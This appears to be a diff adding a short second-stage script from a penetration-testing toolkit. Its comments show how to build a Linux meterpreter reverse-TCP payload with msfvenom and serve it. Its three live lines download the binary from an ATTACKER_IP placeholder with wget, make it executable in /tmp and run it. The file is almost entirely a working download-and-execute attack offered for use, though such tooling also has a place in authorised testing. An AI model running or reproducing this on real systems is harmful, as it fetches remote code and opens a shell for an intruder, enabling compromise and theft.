@@ -1,0 +1,14 @@
+# Second-stage fetch for a Linux target: pull a full meterpreter ELF over HTTP
+# and run it. Feed to an existing session with `resource <this file>`, or set it
+# as autorunscript on a shell handler.
+#
+# Build the ELF (LHOST is your attack address -- `attack tun0` exports $A_IP):
+#   msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$A_IP LPORT=443 \
+#            -f elf -o met.elf
+#
+# Serve it (setup_www_tools stages /var/www/html/tools, or use `serve` from
+# aliases), then replace ATTACKER_IP below. The binary is deliberately not
+# committed to this repo -- rebuild it per engagement so LHOST is correct.
+wget http://ATTACKER_IP/met.elf -O /tmp/met.elf
+chmod 700 /tmp/met.elf
+/tmp/met.elf
